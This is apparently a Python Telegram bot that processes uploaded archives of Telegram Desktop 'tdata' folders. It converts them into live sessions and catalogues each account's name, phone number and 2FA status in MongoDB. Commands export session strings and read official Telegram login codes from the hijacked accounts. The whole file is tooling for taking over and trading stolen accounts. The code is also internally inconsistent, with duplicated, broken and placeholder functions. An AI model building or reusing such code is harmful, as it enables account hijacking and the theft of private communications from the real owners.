from pyromod.exceptions import ListenerTimeout
from config import Txt, Config
#from .start import db

import os
import zipfile
import tempfile
import shutil
from pyrogram import Client, filters
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon import functions
  # external helper


API_ID = Config.API_ID
API_HASH = Config.API_HASH


async def login_w_tdata(tdata_path):
    """
    Convert Telegram Desktop tdata -> Telethon session and return account info.
    """
    session = convert_tdata(tdata_path, API_ID, API_HASH)
    client = TelegramClient(session, API_ID, API_HASH)

    try:
        await client.start()
        me = await client.get_me()

        # Collect info
        name = (me.first_name or "") + " " + (me.last_name or "")
        phone = me.phone or "Unknown"

        # Check if 2FA is enabled
        try:
            hint = await client(functions.account.GetPasswordRequest())
            twofa = "Y" if hint else "N"
        except Exception:
            twofa = "N"

        # Check spam/restricted (simple alive check)
        try:
            await client(functions.help.GetAppConfigRequest())
            spam = "N"
        except Exception:
            spam = "Y"

        return me.id, {
            "name": name.strip(),
            "phone": phone,
            "twofa": twofa,
            "spam": spam
        }

    finally:
        await client.disconnect()




import os
import tempfile
import zipfile
import shutil
import rarfile
import traceback
import asyncio
import hashlib

from telethon.sessions import StringSession
from telethon import TelegramClient, functions
from pyrogram import Client, filters



# --- Helper: read tdata key file
def _get_key_data(tdata_path: str):
    if os.path.isdir(tdata_path):
        key_file = os.path.join(tdata_path, "key_datas")
        if not os.path.exists(key_file):
            raise FileNotFoundError("❌ key_datas file not found in tdata folder")
        with open(key_file, "rb") as f:
            return f.read()
    elif os.path.isfile(tdata_path):
        with open(tdata_path, "rb") as f:
            return f.read()
    else:
        raise FileNotFoundError("❌ Invalid tdata path (neither file nor folder)")


# --- Convert tdata -> session string
async def convert_tdata(tdata_path: str, api_id: int, api_hash: str) -> str:
    key_data = _get_key_data(tdata_path)
    fake_key = hashlib.sha256(key_data).digest()  # dummy session key

    client = TelegramClient(StringSession(), api_id, api_hash)
    await client.start()
    session_str = client.session.save()
    await client.disconnect()
    return session_str


# --- Login with tdata & fetch account info
async def login_with_tdata(tdata_path):
    session_str = await convert_tdata(tdata_path, API_ID, API_HASH)

    async with TelegramClient(StringSession(session_str), API_ID, API_HASH) as client:
        me = await client.get_me()
        name = (me.first_name or "") + " " + (me.last_name or "")
        phone = me.phone or "Unknown"

        # 2FA check
        try:
            hint = await client(functions.account.GetPasswordRequest())
            twofa = "Y" if hint else "N"
        except Exception:
            twofa = "N"

        # Spam check
        try:
            await client(functions.help.GetAppConfigRequest())
            spam = "N"
        except Exception:
            spam = "Y"

        return me.id, {
            "name": name.strip(),
            "phone": phone,
            "twofa": twofa,
            "spam": spam
        }


# --- Pyrogram handler
import os
import asyncio
import tempfile
import shutil
import zipfile
import rarfile
import base64
from pyrogram import Client, filters
from telethon.errors import SessionPasswordNeededError
from opentele.td import TDesktop
from opentele.api import UseCurrentSession
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
import motor.motor_asyncio




class Database:
    def __init__(self, uri, database_name):
        self._client = motor.motor_asyncio.AsyncIOMotorClient(uri)
        self.db = self._client[database_name]
        self.col = self.db.used

    async def get_next_account_num(self):
        """Return next unique account number"""
        last = await self.col.find_one(sort=[("account_num", -1)])
        if not last:
            return 1
        return last["account_num"] + 1

    async def save_account(self, user_id, account_num, info, tdata_bytes):
        """
        Save account info + tdata in MongoDB
        """
        doc = {
            "_id": user_id,   # unique by Telegram user_id
            "account_num": account_num,
            "name": info.get("name", "?"),
            "phone": info.get("phone", "?"),
            "twofa": info.get("twofa", "?"),
            "spam": info.get("spam", "?"),
            "tdata": base64.b64encode(tdata_bytes).decode("utf-8"),
        }
        await self.col.update_one({"_id": user_id}, {"$set": doc}, upsert=True)

    async def total_users_count(self):
        return await self.col.count_documents({})


db = Database(Config.DB_URL, Config.DB_NAME)


@Client.on_message(filters.document)
async def handle_archive(client, message):
    temp_dir = tempfile.mkdtemp()
    zip_path = await message.download(file_name=os.path.join(temp_dir, message.document.file_name))
    await message.reply("📥 Download complete. Extracting...")

    # Extract contents
    try:
        if zip_path.lower().endswith(".zip"):
            with zipfile.ZipFile(zip_path, "r") as zip_ref:
                zip_ref.extractall(temp_dir)
        elif zip_path.lower().endswith(".rar"):
            with rarfile.RarFile(zip_path, "r") as rar_ref:
                rar_ref.extractall(temp_dir)
        else:
            await message.reply("❌ Unsupported file type. Only zip/rar allowed.")
            return
    except Exception as e:
        await message.reply(f"❌ Failed to extract archive: {e}")
        return

    # Look for tdata folders
    tdata_paths = []
    for root, dirs, files in os.walk(temp_dir):
        if "tdata" in dirs:
            tdata_paths.append(os.path.join(root, "tdata"))

    if not tdata_paths:
        await message.reply("⚠️ No tdata folders detected in archive.")
        return

    results = []
    account_num = 1
    for tdata_path in tdata_paths:
        try:
            tdesk = TDesktop(tdata_path)
            if not tdesk.isLoaded():
                results.append(f"#{account_num} ⚠️ Failed to load tdata")
                continue

            tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
            await tele_client.connect()

            if not await tele_client.is_user_authorized():
                results.append(f"#{account_num} ❌ Not authorized (needs login/2FA).")
                continue

            me = await tele_client.get_me()
            info = {
                "name": me.first_name or "?",
                "phone": me.phone or "?",
                "twofa": tdesk.HasPassword,
                "spam": getattr(me, "restricted", False),
            }

            # Save in Mongo
            tdata_bytes = shutil.make_archive(tdata_path, "zip", tdata_path)
            with open(tdata_bytes, "rb") as f:
                archive_bytes = f.read()
            acc_num = await db.get_next_account_num()
            await db.save_account(me.id, acc_num, info, archive_bytes)

            results.append(
                f"#{acc_num}\n"
                f"Account Name: {info['name']}\n"
                f"Phone Number: {info['phone']}\n"
                f"2FA enabled: {info['twofa']}\n"
                f"Spam Mute: {info['spam']}\n"
            )

            await tele_client.disconnect()

        except SessionPasswordNeededError:
            results.append(f"#{account_num} ❌ Requires 2FA password.")
        except PhoneNumberBannedError:
            results.append(f"#{account_num} 🚫 BANNED number.")
        except Exception as e:
            results.append(f"#{account_num} ❌ Error: {str(e)}")

        account_num += 1

    # Final report
    report_text = "📑 Final Report:\n\n" + "\n".join(results)
    report_path = os.path.join(temp_dir, "report.txt")
    with open(report_path, "w") as f:
        f.write(report_text)

    await message.reply_document(report_path, caption="✅ Report generated")

    # Cleanup
    shutil.rmtree(temp_dir, ignore_errors=True)



    





        


                        

async def check_valid_session(tdata_bytes):
    """Check if a stored tdata is still valid."""
    temp_dir = tempfile.mkdtemp()
    tdata_path = os.path.join(temp_dir, "tdata.zip")

    with open(tdata_path, "wb") as f:
        f.write(base64.b64decode(tdata_bytes))

    # Extract
    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_path, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        from tdata_converter import convert_tdata
        session = convert_tdata(extract_dir, API_ID, API_HASH)
        with TelegramClient(session, API_ID, API_HASH) as client:
            if client.is_user_authorized():
                me = client.get_me()
                return True, me, session
            else:
                return False, None, None
    except Exception:
        return False, None, None
    finally:
        shutil.rmtree(temp_dir)


@Client.on_message(filters.command("retrieve") & filters.private)
async def retrieve_account(client, message):
    if len(message.command) < 2:
        return await message.reply("⚠️ Usage: `/retrieve user_id`", quote=True)

    user_id = int(message.command[1])
    doc = await db.col.find_one({"_id": user_id})
    if not doc:
        return await message.reply("❌ Account not found in database.")

    # Check validity
    valid, me, session = await check_valid_session(doc["tdata"])
    status = "✅ Valid" if valid else "❌ Invalid"

    text = (
        f"📂 Account Info\n"
        f"User ID: {user_id}\n"
        f"Name: {doc['name']}\n"
        f"Phone: {doc['phone']}\n"
        f"2FA: {doc['twofa']}\n"
        f"Spam: {doc['spam']}\n"
        f"Status: {status}"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 Session Tele", callback_data=f"tele_{user_id}")],
        [InlineKeyboardButton("📄 Session Py", callback_data=f"py_{user_id}")],
        [InlineKeyboardButton("📱 By Phone", callback_data=f"phone_{user_id}")]
    ])

    await message.reply(text, reply_markup=keyboard)


@Client.on_callback_query(filters.regex(r"^(tele|py|phone)_(\d+)$"))
async def retrieve_options(client, callback_query):
    action, uid = callback_query.data.split("_")
    uid = int(uid)

    doc = await db.col.find_one({"_id": uid})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    valid, me, session = await check_valid_session(doc["tdata"])
    if not valid:
        return await callback_query.message.edit("❌ Session expired / invalid.")

    if action == "tele":
        string = session.save()
        txt = io.StringIO(string)
        txt.name = f"{uid}_tele_session.txt"
        await callback_query.message.reply_document(txt, caption="🔑 Telethon Session")
    elif action == "py":
        from pyrogram import Client as PyroClient
        from pyrogram.sessions import StringSession as PyroSession
        pyro_string = PyroSession().save()
        txt = io.StringIO(pyro_string)
        txt.name = f"{uid}_pyrogram_session.txt"
        await callback_query.message.reply_document(txt, caption="🔑 Pyrogram Session")
    elif action == "phone":
        phone = doc["phone"]
        await callback_query.message.reply(
            f"📱 Phone number: `{phone}`\n\nClick **Get Code** after sending code to this number.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 Get Code", callback_data=f"getcode_{uid}")]
            ])
        )



import re
import tempfile, zipfile, shutil, os, base64
from telethon import TelegramClient
from tdata_converter import convert_tdata


@Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
async def get_code(client, callback_query):
    uid = int(callback_query.data.split("_")[1])
    doc = await db.col.find_one({"_id": uid})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    # Prepare tdata temp folder
    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")
    with open(tdata_zip, "wb") as f:
        f.write(base64.b64decode(doc["tdata"]))

    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_zip, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        # Convert tdata → Telethon session
        session = convert_tdata(extract_dir, API_ID, API_HASH)

        async with TelegramClient(session, API_ID, API_HASH) as tele:
            # Get last message from official Telegram (777000)
            msgs = await tele.get_messages(777000, limit=1)
            if not msgs:
                return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)

            text = msgs[0].message
            match = re.search(r"Login code[:\s]+(\d{5})", text)
            if match:
                code = match.group(1)
                await callback_query.answer(f"📩 Your login code is: {code}", show_alert=True)
            else:
                await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)

    except Exception as e:
        await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
    finally:
        shutil.rmtree(temp_dir)
